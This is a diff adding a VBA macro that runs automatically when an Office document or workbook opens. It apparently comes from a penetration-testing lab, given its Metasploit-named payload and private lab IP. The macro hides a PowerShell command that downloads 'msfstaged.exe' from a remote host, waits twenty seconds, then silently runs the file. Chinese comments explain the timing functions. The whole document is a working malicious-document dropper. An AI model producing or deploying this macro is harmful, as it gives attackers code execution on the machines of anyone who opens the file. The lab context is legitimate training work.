@@ -1,0 +1,21 @@
+Sub Workbook_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
+    Shell str, vbHide
+    Dim UserName As String
+    UserName = Environ("USERNAME")
+    Dim exePath As String
+    exePath = "C:\Users\" & UserName & "\Documents\msfstaged.exe"
+    Application.Wait (Now + TimeValue("0:00:20"))
+    ' Or, TimeSerial(0, 0, 20), TimeSerial 函数接受小时, 分钟和秒作为参数来表示时间; 这个函数的参数是 (小时, 分钟, 秒)
+    ' 这个时间可以稍微延长一些, 比如延长到 20 秒
+    Shell exePath, vbHide
+End Sub
